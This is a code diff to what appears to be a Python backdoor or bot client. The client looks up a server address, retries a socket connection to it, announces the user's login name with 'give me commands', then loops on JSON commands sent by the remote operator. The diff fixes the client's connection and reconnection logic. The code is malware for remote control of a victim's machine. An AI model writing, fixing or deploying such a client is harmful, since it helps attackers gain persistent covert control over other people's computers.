@@ -28,9 +28,9 @@ def search_server_to_connect():
             print("[*]file not found :(")
             time.sleep(20)
             pull()
-    return int(host),int(port)
+    return host,int(port)
 
-target_host, target_port = search_server_to_connect()
+
 hostname = os.getlogin()
 
 
@@ -38,6 +38,7 @@ client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connected = False
 while not connected:
     try:
+        target_host, target_port = search_server_to_connect()
         print("[*]try connection...")
         client.connect((target_host,target_port))
         connected = True
@@ -47,7 +48,7 @@ while not connected:
     time.sleep(3)
 
 close = False
-
+print(client.recv(4096))
 msg = "Hello! i'm " + hostname + " give me commands"
 client.send(msg.encode())
 while not close:
@@ -60,6 +61,7 @@ while not close:
     elif response_json["op"] == "close":
         client.close()
         close = True
+
 
 
 
